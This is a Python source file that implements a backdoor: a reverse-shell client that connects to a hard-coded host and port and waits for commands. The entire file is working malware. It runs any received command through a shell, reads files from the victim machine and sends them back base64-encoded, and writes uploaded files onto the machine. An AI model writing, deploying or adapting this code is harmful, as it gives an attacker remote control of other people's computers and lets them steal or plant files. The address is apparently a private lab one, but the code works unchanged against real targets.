import socket
import json
import subprocess
import os
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.connect((ip, port))

    def reliable_send(self, data):
        if isinstance(data, bytes):
            message = base64.b64encode(data).decode() 
        else:
            message = data
        json_data = json.dumps(message)
        self.conn.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.conn.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        try:
            result = subprocess.check_output(
                command, shell=True, stderr=subprocess.STDOUT)
            return result.decode()
        except subprocess.CalledProcessError as e:
            return e.output.decode()

    def change_working_dir(self, path):
        try:
            os.chdir(path)
            return "[+] Changing working directory."
        except FileNotFoundError:
            return "[-] Directory not found."

    def read_file(self, path):
        try:
            with open(path, 'rb') as file:
                # Encode bytes to base64
                return base64.b64encode(file.read()).decode()
        except FileNotFoundError:
            return "[-] File not found."

    def write_file(self, path, content):
        try:
            with open(path, 'wb') as file:
                file.write(base64.b64decode(content.encode()))
                return "[+] Upload successful."
        except Exception as e:
            return "[-] Upload failed: {}".format(str(e))

    def handle_command(self, command):
        if command[0] == 'exit':
            self.conn.close()
            exit()
        elif command[0] == 'cd' and len(command) > 1:
            command_result = self.change_working_dir(command[1])
        elif command[0] == 'download':
            if len(command) > 1:
                command_result = self.read_file(command[1])
            else:
                command_result = "Usage: download <file_path>"
        elif command[0] == 'upload':
            command_result = self.write_file(command[1], command[2])
        else:
            command_result = self.execute_system_command(command)
        return command_result

    def run(self):
        while True:
            command = self.reliable_receive()
            command_result = self.handle_command(command)
            self.reliable_send(command_result)


my_backdoor = Backdoor('192.168.64.2', 8080)
my_backdoor.run()
